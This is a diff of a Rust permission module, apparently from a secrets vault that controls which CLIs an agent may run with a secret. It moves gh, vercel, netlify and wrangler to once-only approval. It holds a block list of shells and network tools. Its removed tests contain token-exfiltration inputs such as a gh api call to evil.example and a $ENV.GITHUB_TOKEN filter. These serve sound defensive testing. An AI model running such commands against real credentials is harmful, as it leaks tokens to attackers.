@@ -119,11 +119,11 @@ impl Mask {
 }
 
 /// Programs that run code the agent can write, and so could do anything
-/// with a value: they are only ever offered Once, never Always. The
-/// deploy and cloud CLIs the Vault is mostly for are not here but in
-/// [`pinned`]: what could make them run other code is in files of their
-/// own, and an Always holds only while those files stay as they were.
-/// Everything here runs the agent's code by design, so no pin helps.
+/// with a value: they are only ever offered Once, never Always. A few
+/// cloud CLIs are not here but in [`pinned`]: what could make them run
+/// other code is in files of their own, and an Always holds only while
+/// those files stay as they were. Everything here runs the agent's code
+/// by design, or runs git, so no pin helps.
 const ONCE_ONLY: &[&str] = &[
     // Shells and interpreters.
     "sh", "bash", "zsh", "fish", "dash", "cmd", "powershell", "pwsh", "python", "python3", "py",
@@ -150,6 +150,8 @@ const ONCE_ONLY: &[&str] = &[
     // Version control, and the infrastructure tools that run the
     // project's own code as their configuration.
     "git", "ssh", "scp", "sftp", "terraform", "tofu", "pulumi", "podman", "git-lfs", "scalar",
+    // They run git; see [`RUN_GIT`].
+    "gh", "vercel", "netlify", "wrangler",
     "git-receive-pack", "git-upload-pack", "ftp", "tclsh", "wish", "wt", "control",
     // Their exec paths are too many to pin: `docker run -e NAME`, a
     // kubeconfig's exec plugin named by a flag, helm's --post-renderer.
@@ -165,11 +167,11 @@ const ONCE_ONLY: &[&str] = &[
 pub enum PinKind {
     /// One file's content.
     File,
+    /// A config file's content, which must read as UTF-8: one that does
+    /// not may be read by the program otherwise than it reads here.
+    Text,
     /// Every folder and file under it.
     Tree,
-    /// Every folder and file under it but files of this name, which the
-    /// program rewrites by itself: gh's `state.yml` from its update check.
-    TreeBut(&'static str),
     /// Only the names of what is at its top, for a folder whose new
     /// entries matter but whose content another pin covers or churns:
     /// the global `node_modules` a package can load a planted one from.
@@ -180,22 +182,19 @@ pub enum PinKind {
 /// it could make the program run other code.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct Pin {
-    /// How the question names it: `gh's config.yml`. Never holds `,`, `=`
+    /// How the question names it: `the aws config`. Never holds `,`, `=`
     /// or `|`, which [`fingerprint`] uses.
     pub what: String,
     pub path: String,
     pub kind: PinKind,
 }
 
-/// The deploy and cloud CLIs that may have Always once what could make
-/// them run other code is pinned: their aliases, extensions, plugins and
-/// exec hook files. Some for the program at this path, the files and
-/// folders to pin as `env` (the environment the child will get, an
-/// identity's own folders included) places them; None for any other
-/// program. A program that keeps no such file pins nothing extra, but is
-/// still here, since the caller pins the npm package it runs from and the
-/// git repository it runs in. What its arguments can make it do is
-/// [`always_refused`]'s.
+/// The cloud CLIs that may have Always once what could make them run
+/// other code is pinned: their aliases, plugins and exec hook files. Some
+/// for the program at this path, the files and folders to pin as `env`
+/// (the environment the child will get, an identity's own folders
+/// included) places them; None for any other program. What their
+/// arguments can make them do is [`always_refused`]'s.
 pub fn pinned(program_path: &str, env: &dyn Fn(&str) -> Option<String>) -> Option<Vec<Pin>> {
     let stem = stem_of(program_path);
     let var = |k: &str| env(k).filter(|v| !v.trim().is_empty());
@@ -208,51 +207,35 @@ pub fn pinned(program_path: &str, env: &dyn Fn(&str) -> Option<String>) -> Optio
         })
     };
     let pins: Vec<Option<Pin>> = match stem.as_str() {
-        "gh" => {
-            let config = var("GH_CONFIG_DIR")
-                .or_else(|| var("XDG_CONFIG_HOME").map(|x| join(&x, "gh")))
-                .or_else(|| var("APPDATA").map(|a| join(&a, "GitHub CLI")));
-            let data = var("GH_DATA_DIR")
-                .or_else(|| var("XDG_DATA_HOME").map(|x| join(&x, "gh")))
-                .or_else(|| var("LOCALAPPDATA").map(|a| join(&a, "GitHub CLI")));
-            vec![
-                pin("gh's config.yml", PinKind::File, config.map(|c| join(&c, "config.yml"))),
-                pin(
-                    "gh's extensions",
-                    PinKind::TreeBut("state.yml"),
-                    data.map(|d| join(&d, "extensions")),
-                ),
-            ]
-        }
         "aws" => vec![
             pin(
                 "the aws config",
-                PinKind::File,
+                PinKind::Text,
                 var("AWS_CONFIG_FILE").or_else(|| home().map(|h| join(&h, r".aws\config"))),
             ),
             // `credential_process` runs a command from here too.
             pin(
                 "the aws credentials file",
-                PinKind::File,
+                PinKind::Text,
                 var("AWS_SHARED_CREDENTIALS_FILE").or_else(|| home().map(|h| join(&h, r".aws\credentials"))),
             ),
             // Aliases run `!` shell commands. The folder's own content is
             // the credential cache, which churns, so only its names count.
-            pin("the aws aliases", PinKind::File, home().map(|h| join(&h, r".aws\cli\alias"))),
+            pin("the aws aliases", PinKind::Text, home().map(|h| join(&h, r".aws\cli\alias"))),
             pin("the aws cli folder", PinKind::Names, home().map(|h| join(&h, r".aws\cli"))),
         ],
         "gcloud" => {
             let dir = var("CLOUDSDK_CONFIG").or_else(|| var("APPDATA").map(|a| join(&a, "gcloud")));
             vec![
-                pin("gcloud's properties", PinKind::File, dir.as_ref().map(|d| join(d, "properties"))),
-                pin("gcloud's active_config", PinKind::File, dir.as_ref().map(|d| join(d, "active_config"))),
+                pin("gcloud's properties", PinKind::Text, dir.as_ref().map(|d| join(d, "properties"))),
+                pin("gcloud's active_config", PinKind::Text, dir.as_ref().map(|d| join(d, "active_config"))),
                 pin("gcloud's configurations", PinKind::Tree, dir.map(|d| join(&d, "configurations"))),
             ]
         }
         "az" => {
             let dir = var("AZURE_CONFIG_DIR").or_else(|| home().map(|h| join(&h, ".azure")));
             vec![
-                pin("az's config", PinKind::File, dir.as_ref().map(|d| join(d, "config"))),
+                pin("az's config", PinKind::Text, dir.as_ref().map(|d| join(d, "config"))),
                 pin(
                     "az's extensions",
                     PinKind::Tree,
@@ -260,20 +243,16 @@ pub fn pinned(program_path: &str, env: &dyn Fn(&str) -> Option<String>) -> Optio
                 ),
             ]
         }
-        // Their own config holds tokens that refresh, never a command, so
-        // pinning it would only ask again for nothing. What they can be made
-        // to run is the project's build; see [`runs_builds`].
-        "vercel" | "wrangler" | "netlify" => Vec::new(),
         _ => return None,
     };
     Some(pins.into_iter().flatten().collect())
 }
 
 /// What an Always is for beside the program: the leading words of the
-/// command line that read as subcommands, `pr create` of `gh pr create
-/// --fill`, so allowing one does not allow `gh api`. Words stop at the
-/// first flag or the first that is not a plain name (a number, a path, a
-/// URL), and at three.
+/// command line that read as subcommands, `s3 ls` of `aws s3 ls
+/// s3://bucket`, so allowing one does not allow another. Words stop at
+/// the first flag or the first that is not a plain name (a number, a
+/// path, a URL), and at three.
 pub fn command_path(args: &[String]) -> String {
     args.iter()
         .take_while(|a| {
@@ -287,112 +266,50 @@ pub fn command_path(args: &[String]) -> String {
         .join(" ")
 }
 
-/// What a CLI's arguments can make it do that no pin covers, for the
-/// question's "Only Once is offered: ...". Every program here has Always
-/// only for a run that names a subcommand first, with no flag before it,
-/// so an Always never covers a whole CLI.
+/// What a pinned CLI's arguments can make it do that no pin covers, for
+/// the question's "Only Once is offered: ...". Each has Always only for a
+/// run that names a subcommand first, with no flag before it, so an
+/// Always never covers a whole CLI.
 struct Rules {
     stems: &'static [&'static str],
-    /// Flags refused whatever their value. A one letter flag is refused
-    /// inside a cluster too: `-iq` holds `-q`.
+    /// Flags refused whatever their value.
     flags: &'static [&'static str],
-    /// One letter flags refused but under these command paths, where the
-    /// letter means something harmless: gh's `-t` is a title there.
-    flags_but: &'static [(&'static str, &'static [&'static str])],
     /// Flags refused when their value names a file to read.
     file_flags: &'static [&'static str],
-    /// Flags refused when their value names another host.
-    host_flags: &'static [&'static str],
-    /// Command paths refused, and every path under them.
+    /// Command paths refused, and every path under them: those that
+    /// install or fetch code, run git, or change the CLI's own config.
     commands: &'static [&'static str],
-    /// The top-level commands it has; any other first word may name an
-    /// extension, which is code of anyone's.
-    known: Option<&'static [&'static str]>,
-    /// Command paths under which an argument holding `://` sends the
-    /// request, and the token, somewhere else.
-    url_commands: &'static [&'static str],
     /// Reads arguments from `@file`, which the agent can write.
     response_files: bool,
-    /// Long flags refused when their name holds one of these: an API or
-    /// base URL override sends the token to another host, and for a CLI
-    /// whose flags are not all known, any that could be one is refused.
-    flag_words: &'static [&'static str],
-    /// Command paths after which an operand past `--` goes to git as a
-    /// flag of its own: `gh repo clone o/r -- --config ...`.
-    no_git_flags: &'static [&'static str],
 }
-
-const GH_COMMANDS: &[&str] = &[
-    "accessibility", "agent-task", "alias", "api", "attestation", "auth", "browse", "cache", "co",
-    "codespace", "completion", "config", "copilot", "extension", "ext", "gist", "gpg-key", "help",
-    "issue", "label", "licenses", "org", "pr", "preview", "project", "release", "repo", "ruleset",
-    "run", "search", "secret", "ssh-key", "status", "variable", "version", "workflow",
-];
-
-/// Where gh's `-t` is `--title`, not `--template`.
-const GH_TITLES: &[&str] = &["pr create", "pr edit", "issue create", "issue edit", "release create", "release edit"];
-
-const NONE: Rules = Rules {
-    stems: &[],
-    flags: &[],
-    flags_but: &[],
-    file_flags: &[],
-    host_flags: &[],
-    commands: &[],
-    known: None,
-    url_commands: &[],
-    response_files: false,
-    flag_words: &[],
-    no_git_flags: &[],
-};
 
 const RULES: &[Rules] = &[
     Rules {
-        stems: &["gh"],
-        // `--jq` and `--template` read the environment: `$ENV.GITHUB_TOKEN`.
-        flags: &["--jq", "-q", "--template", "--hostname"],
-        flags_but: &[("-t", GH_TITLES)],
-        host_flags: &["-R", "--repo"],
-        // `repo clone` and `repo fork` make or change a repository other
-        // than the one pinned, so the run cannot be held to it.
-        commands: &["alias", "auth", "extension", "ext", "config set", "repo clone", "repo fork"],
-        known: Some(GH_COMMANDS),
-        url_commands: &["api"],
-        no_git_flags: &["repo clone", "repo fork"],
-        ..NONE
-    },
-    Rules {
         stems: &["aws"],
+        flags: &[],
         file_flags: &["--cli-input-json", "--cli-input-yaml"],
-        commands: &["configure"],
-        ..NONE
+        // `codeartifact login` runs npm, pip or dotnet to set them up.
+        commands: &["configure", "codeartifact login"],
+        response_files: false,
     },
     Rules {
         stems: &["gcloud"],
         flags: &["--flags-file"],
-        ..NONE
+        file_flags: &[],
+        // `source` runs git; `components` installs code.
+        commands: &["source", "components"],
+        response_files: false,
     },
     Rules {
         stems: &["az"],
+        flags: &[],
+        file_flags: &[],
+        // Each installs or fetches code that runs as az, or starts git or
+        // docker: `repos` checks out with git, `acr login` runs docker.
+        commands: &["extension", "bicep", "upgrade", "repos", "devops", "acr login"],
         response_files: true,
-        ..NONE
-    },
-    Rules {
-        stems: &["vercel", "netlify", "wrangler"],
-        // vercel's `--api` sends VERCEL_TOKEN wherever it says, `-Q` is
-        // its short `--global-config`, `--cwd` runs it in another project.
-        flags: &["--local-config", "--global-config", "-A", "-Q", "--config", "-c", "--api", "--cwd"],
-        flag_words: &["api", "url"],
-        ..NONE
     },
 ];
-
-/// A `-R` value that names a host: `ghe.example/o/r`, `host/o/r`.
-fn names_host(value: &str) -> bool {
-    value.contains("://")
-        || value.split('/').count() >= 3
-        || value.split('/').next().is_some_and(|h| h.contains('.'))
-}
 
 /// Why the arguments leave only Once for the program `stem` names, None
 /// when they do not.
@@ -410,34 +327,13 @@ pub fn always_refused(stem: &str, args: &[String]) -> Option<String> {
         ));
     }
     let path = command_path(args);
-    let first = path.split(' ').next().unwrap_or_default();
-    if first.is_empty() {
+    if path.is_empty() {
         return Some(format!("it names no {stem} subcommand, and Always would cover all of them"));
-    }
-    if rules.known.is_some_and(|known| !known.contains(&first)) {
-        return Some(format!("`{first}` may be an extension, someone else's code"));
     }
     let under = |c: &str| path == c || path.starts_with(&format!("{c} "));
     if let Some(c) = rules.commands.iter().find(|c| under(c)) {
-        return Some(format!("`{stem} {c}` changes what {stem} runs or where its token goes"));
+        return Some(format!("`{stem} {c}` installs code or changes what {stem} runs"));
     }
-    if rules.url_commands.iter().any(|c| under(c)) && args.iter().any(|a| a.contains("://")) {
-        return Some("it names a full URL, which can send the token to another host".into());
-    }
-    if rules.no_git_flags.iter().any(|c| under(c)) {
-        if let Some(at) = args.iter().position(|a| a == "--") {
-            if at + 1 < args.len() {
-                return Some("what follows `--` goes to git, which can run anything".into());
-            }
-        }
-    }
-    let short_refused = |letter: char| {
-        rules.flags.iter().any(|f| *f == format!("-{letter}"))
-            || rules
-                .flags_but
-                .iter()
-                .any(|(f, but)| *f == format!("-{letter}") && !but.iter().any(|c| under(c)))
-    };
     let mut i = 0;
     while i < args.len() {
         let a = args[i].as_str();
@@ -450,289 +346,59 @@ pub fn always_refused(stem: &str, args: &[String]) -> Option<String> {
         if rules.response_files && a.starts_with('@') {
             return Some(format!("`{a}` reads more arguments from a file the agent can write"));
         }
-        if let Some(long) = a.strip_prefix("--") {
-            let (name, inline) = match long.split_once('=') {
-                Some((n, v)) => (n, Some(v)),
-                None => (long, None),
-            };
-            let flag = format!("--{name}");
-            let value = inline.or(next);
-            let lower = name.to_ascii_lowercase();
-            if rules.flags.contains(&flag.as_str()) || rules.flag_words.iter().any(|w| lower.contains(w)) {
-                return Some(format!("`{flag}` can make {stem} read or run more than its command"));
-            }
-            if rules.file_flags.contains(&flag.as_str())
-                && value.is_some_and(|v| {
-                    let v = v.to_ascii_lowercase();
-                    v.starts_with("file://") || v.starts_with("fileb://")
-                })
-            {
-                return Some(format!("`{flag}` reads its input from a file the agent can write"));
-            }
-            if rules.host_flags.contains(&flag.as_str()) && value.is_some_and(names_host) {
-                return Some(format!("`{flag}` names another host, where the token would go"));
-            }
-            continue;
-        }
-        let Some(cluster) = a.strip_prefix('-').filter(|c| !c.is_empty()) else {
+        let Some(long) = a.strip_prefix("--") else {
             continue;
         };
-        if let Some(letter) = cluster.chars().find(|c| short_refused(*c)) {
-            return Some(format!("`-{letter}` can make {stem} read or run more than its command"));
+        let (name, inline) = match long.split_once('=') {
+            Some((n, v)) => (n, Some(v)),
+            None => (long, None),
+        };
+        let flag = format!("--{name}");
+        if rules.flags.contains(&flag.as_str()) {
+            return Some(format!("`{flag}` can make {stem} read or run more than its command"));
         }
-        for f in rules.host_flags.iter().filter_map(|f| f.strip_prefix('-').filter(|f| f.len() == 1)) {
-            if let Some((_, rest)) = cluster.split_once(f) {
-                let value = if rest.is_empty() { next } else { Some(rest) };
-                if value.is_some_and(names_host) {
-                    return Some(format!("`-{f}` names another host, where the token would go"));
-                }
-            }
+        let value = inline.or(next);
+        if rules.file_flags.contains(&flag.as_str())
+            && value.is_some_and(|v| {
+                let v = v.to_ascii_lowercase();
+                v.starts_with("file://") || v.starts_with("fileb://")
+            })
+        {
+            return Some(format!("`{flag}` reads its input from a file the agent can write"));
         }
     }
     None
 }
 
-/// What a git config file says that decides what git runs: the files it
-/// includes (`include.path`, `includeIf.*.path`), the hooks folder
-/// (`core.hooksPath`), and every key in it, for [`git_key_refused`].
-/// `odd` is set by anything this reading and git's could take
-/// differently: a `;`, `#` or `\` in a value outside quotes, a `\`
-/// anywhere in one, a header that does not close.
-#[derive(Clone, Debug, Default, PartialEq, Eq)]
-pub struct GitRefs {
-    pub includes: Vec<String>,
-    pub hooks_path: Option<String>,
-    pub odd: bool,
-    pub keys: Vec<GitKey>,
-}
+/// The CLIs that run git, which a pin cannot hold: its config, hooks,
+/// filters, drivers and helpers are too many ways to run a program with
+/// the secret in reach. A token for them is asked for Once each time;
+/// unattended, they use the identity's own login instead.
+const RUN_GIT: &[&str] = &["gh", "vercel", "netlify", "wrangler"];
 
-/// One setting of a git config: `[remote "origin"] url = x` is section
-/// `remote`, sub `origin`, name `url`. Section and name in lower case, as
-/// git compares them; the sub as written.
-#[derive(Clone, Debug, PartialEq, Eq)]
-pub struct GitKey {
-    pub section: String,
-    pub sub: Option<String>,
-    pub name: String,
-    pub value: String,
-}
-
-impl GitKey {
-    /// `remote.origin.url`, for the question.
-    pub fn shown(&self) -> String {
-        match &self.sub {
-            Some(s) => format!("{}.{s}.{}", self.section, self.name),
-            None => format!("{}.{}", self.section, self.name),
-        }
-    }
-}
-
-pub fn git_refs(config: &str) -> GitRefs {
-    let mut out = GitRefs::default();
-    let mut section = String::new();
-    let mut sub: Option<String> = None;
-    let config = config.strip_prefix('\u{feff}').unwrap_or(config);
-    for line in config.lines() {
-        let line = line.trim();
-        if line.is_empty() || line.starts_with(['#', ';']) {
-            continue;
-        }
-        let line = if let Some(rest) = line.strip_prefix('[') {
-            let Some((head, after)) = rest.split_once(']') else {
-                out.odd = true;
-                continue;
-            };
-            let head = head.trim();
-            // A `]` inside a quoted subsection ends the header early here
-            // and not in git.
-            if head.matches('"').count() % 2 == 1 {
-                out.odd = true;
-            }
-            let name = head.split([' ', '"', '.']).next().unwrap_or_default();
-            section = name.to_ascii_lowercase();
-            let rest = head[name.len()..].trim();
-            sub = if let Some(q) = rest.strip_prefix('"') {
-                Some(q.strip_suffix('"').unwrap_or(q).to_string())
-            } else {
-                rest.strip_prefix('.').map(str::to_string)
-            };
-            // `[include] path = x` on one line.
-            after.trim()
-        } else {
-            line
+/// Why the program at this path is only ever offered Once, None when it
+/// may have Always. For a CLI that runs git, the reason says how to use
+/// it unattended.
+pub fn once_reason(program_path: &str) -> Option<String> {
+    let stem = stem_of(program_path);
+    if RUN_GIT.contains(&stem.as_str()) {
+        let then = match login_tool(program_path) {
+            Some(tool) => format!("; for unattended use, log {tool} in for this project's identity in Settings"),
+            None => String::new(),
         };
-        if line.is_empty() {
-            continue;
-        }
-        // A key alone is a true boolean.
-        let (key, value) = line.split_once('=').unwrap_or((line, "true"));
-        let key = key.trim().to_ascii_lowercase();
-        let value = value.trim();
-        // As git reads a value: quotes dropped, `\\ \" \n \t \b` unescaped.
-        // Anything else (another escape, a line continued, a comment
-        // after the value) is read as odd rather than guessed at.
-        let mut quoted = false;
-        let mut read = String::with_capacity(value.len());
-        let mut chars = value.chars();
-        while let Some(c) = chars.next() {
-            match c {
-                '"' => quoted = !quoted,
-                '\\' => match chars.next() {
-                    Some('\\') => read.push('\\'),
-                    Some('"') => read.push('"'),
-                    Some('n') => read.push('\n'),
-                    Some('t') => read.push('\t'),
-                    Some('b') => read.push('\u{8}'),
-                    _ => out.odd = true,
-                },
-                ';' | '#' if !quoted => out.odd = true,
-                c => read.push(c),
-            }
-        }
-        if quoted {
-            out.odd = true;
-        }
-        let value = read;
-        match (section.as_str(), key.as_str()) {
-            ("include" | "includeif", "path") => out.includes.push(value.clone()),
-            ("core", "hookspath") => out.hooks_path = Some(value.clone()),
-            _ => {}
-        }
-        out.keys.push(GitKey {
-            section: section.clone(),
-            sub: sub.clone(),
-            name: key,
-            value,
-        });
+        return Some(format!("{stem} runs git, which can run other programs with the secret{then}"));
     }
-    out
+    once_only(program_path).then(|| "it can run code the agent writes".to_string())
 }
 
-/// Credential helpers that are git's own or the system's, by name.
-const KNOWN_HELPERS: &[&str] = &["", "manager", "manager-core", "wincred"];
-
-/// gh's own helper, as `gh auth setup-git` writes it: the path to a gh,
-/// for the caller to check is one the agent could not have put there.
-/// None for any other value.
-pub fn gh_helper(value: &str) -> Option<String> {
-    let rest = value.trim().strip_prefix('!')?;
-    let rest = rest.trim();
-    let (program, tail) = match rest.strip_prefix('"').or_else(|| rest.strip_prefix('\'')) {
-        Some(q) => {
-            let end = q.find(['"', '\''])?;
-            (&q[..end], q[end + 1..].trim())
-        }
-        None => rest.split_once(' ').map(|(p, t)| (p, t.trim()))?,
-    };
-    let file = program.rsplit(['/', '\\']).next()?.to_ascii_lowercase();
-    (tail == "auth git-credential" && (file == "gh" || file == "gh.exe")).then(|| program.to_string())
-}
-
-/// Why a git config setting leaves only Once: anything not known to be
-/// data. Git runs programs from config in many places (filters, drivers,
-/// `core.sshCommand`, `credential.helper`, `url.*.insteadOf` to a host of
-/// the agent's), so the list is of what is allowed, not what is not.
-/// Those Horadric overrides for the run (hooks, fsmonitor, attributes
-/// file, editor, pager) are allowed, as is gh's own credential helper,
-/// whose program the caller checks.
-pub fn git_key_refused(k: &GitKey) -> bool {
-    let sub = k.sub.is_some();
-    let v = k.value.to_ascii_lowercase();
-    let off = matches!(v.as_str(), "false" | "no" | "off" | "0" | "");
-    let name = k.name.as_str();
-    let allowed = match k.section.as_str() {
-        "include" | "includeif" => name == "path",
-        "user" => !sub && matches!(name, "name" | "email" | "signingkey" | "usetabs"),
-        "commit" | "tag" => !sub && name == "gpgsign" && off,
-        "init" => !sub && name == "defaultbranch",
-        "core" => {
-            !sub && matches!(
-                name,
-                "repositoryformatversion"
-                    | "filemode"
-                    | "bare"
-                    | "logallrefupdates"
-                    | "symlinks"
-                    | "ignorecase"
-                    | "autocrlf"
-                    | "eol"
-                    | "safecrlf"
-                    | "longpaths"
-                    | "quotepath"
-                    | "precomposeunicode"
-                    | "compression"
-                    | "packedgitlimit"
-                    | "fscache"
-                    | "preloadindex"
-                    | "untrackedcache"
-                    | "checkstat"
-                    | "trustctime"
-                    | "excludesfile"
-                    | "whitespace"
-                    // Overridden for every Always run.
-                    | "hookspath"
-                    | "fsmonitor"
-                    | "attributesfile"
-                    | "editor"
-                    | "pager"
-            )
-        }
-        "sequence" => !sub && name == "editor",
-        "remote" => {
-            sub && matches!(name, "url" | "pushurl" | "fetch" | "push" | "tagopt" | "prune" | "gh-resolved" | "mirror")
-                && !v.starts_with("ext::")
-        }
-        "branch" => {
-            sub && matches!(
-                name,
-                "remote" | "merge" | "rebase" | "pushremote" | "vscode-merge-base" | "gh-merge-base" | "description"
-            )
-        }
-        "pull" => !sub,
-        "push" => !sub && matches!(name, "default" | "autosetupremote" | "followtags"),
-        "fetch" => !sub && matches!(name, "prune" | "prunetags"),
-        "merge" => !sub && matches!(name, "ff" | "conflictstyle"),
-        "rebase" => !sub && matches!(name, "autostash" | "autosquash"),
-        "diff" => !sub && matches!(name, "renames" | "algorithm" | "colormoved" | "mnemonicprefix"),
-        "format" => !sub && name == "pretty",
-        "color" | "column" | "advice" | "status" | "log" | "gc" | "pack" | "index" | "feature"
-        | "maintenance" | "gui" => true,
-        "safe" => !sub && name == "directory",
-        "credential" => match name {
-            "helper" => KNOWN_HELPERS.contains(&v.as_str()) || gh_helper(&k.value).is_some(),
-            "provider" | "username" | "usehttppath" => true,
-            _ => false,
-        },
-        "http" => matches!(name, "sslbackend" | "schannelcheckrevoke" | "schannelusesslcainfo" | "postbuffer" | "version"),
-        // Aliases never replace one of git's own commands, and these CLIs
-        // run only git's own.
-        "alias" => true,
-        _ => false,
-    };
-    !allowed
-}
-
-/// Major and minor of `git --version`'s line: `git version 2.56.0.windows.4`.
-pub fn git_version(line: &str) -> Option<(u32, u32)> {
-    let v = line.trim().strip_prefix("git version ")?;
-    let mut parts = v.split('.');
-    let major = parts.next()?.parse().ok()?;
-    let minor = parts.next()?.chars().take_while(char::is_ascii_digit).collect::<String>().parse().ok()?;
-    Some((major, minor))
-}
-
-/// `GIT_CONFIG_PARAMETERS` with `pairs` added to what it held, quoted as
-/// git reads it: each `'key=value'`, a `'` inside written `'\''`.
-pub fn git_config_parameters(existing: Option<&str>, pairs: &[(&str, &str)]) -> String {
-    let quote = |s: &str| format!("'{}'", s.replace('\'', r"'\''"));
-    let mut out: Vec<String> = existing
-        .map(str::trim)
-        .filter(|e| !e.is_empty())
-        .map(str::to_string)
-        .into_iter()
-        .collect();
-    out.extend(pairs.iter().map(|(k, v)| quote(&format!("{k}={v}"))));
-    out.join(" ")
+/// The identity login that stands in for a secret for this program, as
+/// `--on-login` names it: gh and vercel have their own.
+pub fn login_tool(program_path: &str) -> Option<&'static str> {
+    match stem_of(program_path).as_str() {
+        "gh" => Some("gh"),
+        "vercel" => Some("vercel"),
+        _ => None,
+    }
 }
 
 /// Whether the program deploys by running the project's own build
@@ -1285,24 +951,17 @@ mod tests {
     }
 
     #[test]
-    fn deploy_and_cloud_clis_are_pinned_not_once_only() {
+    fn cloud_clis_are_pinned_and_git_running_ones_once_only() {
+        for p in [r"C:\Program Files\Amazon\AWSCLIV2\aws.exe", "az", "gcloud"] {
+            assert!(pinned(p, &|_| None).is_some(), "{p}");
+            assert!(!once_only(p), "{p}");
+        }
         for p in [
             r"C:\Program Files\GitHub CLI\gh.exe",
-            r"C:\tools\vercel.exe",
-            r"C:\Users\a\AppData\Roaming\npm\wrangler.cmd",
+            r"C:\Users\a\AppData\Roaming\npm\vercel.cmd",
             "netlify",
-            r"C:\Program Files\Amazon\AWSCLIV2\aws.exe",
-            "az",
-            "gcloud",
-        ] {
-            assert!(pinned(p, &|_| None).is_some(), "{p}");
-            assert!(!ONCE_ONLY.contains(&stem_of(p).as_str()), "{p}");
-        }
-        for p in ["terraform", "tofu", "pulumi", "git", "npm", "curl", "stripe", "docker", "kubectl", "helm"] {
-            assert!(pinned(p, &|_| None).is_none(), "{p}");
-        }
-        for p in [
-            r"C:\Program Files\Docker\Docker\resources\bin\docker.exe",
+            "wrangler",
+            "docker",
             "kubectl",
             "helm",
             "git-lfs",
@@ -1318,40 +977,33 @@ mod tests {
             "wish",
         ] {
             assert!(once_only(p), "{p}");
+            assert!(pinned(p, &|_| None).is_none(), "{p}");
+        }
+        for p in ["terraform", "git", "npm", "curl", "stripe"] {
+            assert!(pinned(p, &|_| None).is_none(), "{p}");
         }
         assert!(runs_builds("vercel.cmd") && runs_builds("wrangler") && runs_builds("NETLIFY.exe"));
         assert!(!runs_builds("gh.exe"));
     }
 
     #[test]
-    fn gh_pins_its_config_and_extensions_where_its_env_puts_them() {
-        let home = [
-            ("APPDATA", r"C:\Users\a\AppData\Roaming"),
-            ("LOCALAPPDATA", r"C:\Users\a\AppData\Local"),
-        ];
+    fn a_git_running_cli_is_told_to_use_the_identity_login() {
+        let gh = once_reason(r"C:\Program Files\GitHub CLI\gh.exe").unwrap();
         assert_eq!(
-            pin_paths("gh.exe", &home).unwrap(),
-            [
-                (
-                    "gh's config.yml".to_string(),
-                    r"C:\Users\a\AppData\Roaming\GitHub CLI\config.yml".to_string(),
-                    PinKind::File
-                ),
-                (
-                    "gh's extensions".to_string(),
-                    r"C:\Users\a\AppData\Local\GitHub CLI\extensions".to_string(),
-                    PinKind::TreeBut("state.yml")
-                ),
-            ]
+            gh,
+            "gh runs git, which can run other programs with the secret; for unattended use, log gh in for this project's identity in Settings"
         );
-        let identity = [
-            ("APPDATA", r"C:\Users\a\AppData\Roaming"),
-            ("GH_CONFIG_DIR", r"C:\ids\work\gh\"),
-            ("XDG_DATA_HOME", r"C:\ids\work\data"),
-        ];
-        let p = pin_paths("gh", &identity).unwrap();
-        assert_eq!(p[0].1, r"C:\ids\work\gh\config.yml");
-        assert_eq!(p[1].1, r"C:\ids\work\data\gh\extensions");
+        assert!(once_reason("vercel.cmd").unwrap().contains("log vercel in"));
+        let netlify = once_reason("netlify").unwrap();
+        assert!(netlify.starts_with("netlify runs git") && !netlify.contains("log"), "{netlify}");
+        assert_eq!(once_reason("bash").as_deref(), Some("it can run code the agent writes"));
+        assert_eq!(once_reason("curl"), None);
+        assert_eq!(once_reason("aws"), None);
+        assert_eq!(login_tool("gh.exe"), Some("gh"));
+        assert_eq!(login_tool("wrangler"), None);
+        for t in ["gh", "vercel"] {
+            assert!(crate::vault::identity::Tool::from_name(t).is_some(), "{t} is a login --on-login takes");
+        }
     }
 
     #[test]
@@ -1369,6 +1021,7 @@ mod tests {
                 r"C:\Users\a\.aws\cli"
             ]
         );
+        assert_eq!(pin_paths("aws", &home).unwrap()[0].2, PinKind::Text);
         assert_eq!(pin_paths("aws", &home).unwrap()[3].2, PinKind::Names);
         assert_eq!(
             paths("aws", &[("USERPROFILE", r"C:\Users\a"), ("AWS_CONFIG_FILE", r"D:\aws.cfg")])[0],
@@ -1379,7 +1032,6 @@ mod tests {
             [r"D:\g\properties", r"D:\g\active_config", r"D:\g\configurations"]
         );
         assert_eq!(paths("az", &home), [r"C:\Users\a\.azure\config", r"C:\Users\a\.azure\cliextensions"]);
-        assert!(paths("vercel", &home).is_empty());
         // No home to place them in pins nothing rather than a wrong path.
         assert!(paths("aws", &[]).is_empty());
         for pin in pinned("gcloud", &env_of(&home)).unwrap() {
@@ -1393,12 +1045,10 @@ mod tests {
 
     #[test]
     fn an_always_is_for_the_subcommand_too() {
-        assert_eq!(command_path(&args("pr create --fill")), "pr create");
-        assert_eq!(command_path(&args("api repos/a/b/issues")), "api");
-        assert_eq!(command_path(&args("pr view 123")), "pr view");
+        assert_eq!(command_path(&args("s3 ls s3://b")), "s3 ls");
+        assert_eq!(command_path(&args("ec2 describe-instances --region x")), "ec2 describe-instances");
         assert_eq!(command_path(&args("--version")), "");
         assert_eq!(command_path(&args("a b c d")), "a b c");
-        assert_eq!(command_path(&args("deploy --prod")), "deploy");
         assert_eq!(command_path(&args("https://x.example")), "");
         assert_eq!(command_path(&[]), "");
     }
@@ -1406,202 +1056,34 @@ mod tests {
     #[test]
     fn arguments_that_reach_past_the_command_leave_only_once() {
         let refused = |stem: &str, line: &str| always_refused(stem, &args(line)).is_some();
-        // gh's output filters read the environment, alone or in a cluster.
-        for line in [
-            "api user --jq $ENV.GITHUB_TOKEN",
-            "api user -q .login",
-            "api user -q.login",
-            "api user -iq $ENV.GITHUB_TOKEN",
-            "api user --jq=.x",
-            "pr list --template {{.}}",
-            "pr list -t x",
-            "pr list -wt x",
-            "alias set x !sh",
-            "extension install a/b",
-            "ext list",
-            "config set editor x",
-            "auth token",
-            "auth status --show-token",
-            "my-extension run",
-            "pr list --hostname ghe.example",
-            "pr list -R ghe.example/o/r",
-            "pr list -Rhost/o/r",
-            "pr list --repo=host/o/r",
-            "pr list --repo ghe.example.com/r",
-            "api https://evil.example/x",
-            "api -X GET -- https://evil.example/x",
-        ] {
-            assert!(refused("gh.exe", line), "gh {line}");
-        }
-        for line in [
-            "pr create --fill",
-            "pr create -t title",
-            "issue edit 3 -t title",
-            "api repos/a/b",
-            "repo view",
-            "pr list -R o/r",
-            "pr list --repo=o/r",
-            "config get editor",
-            "--version",
-            "--help",
-            // A flag after `--` is an operand.
-            "pr create --fill -- -q",
-        ] {
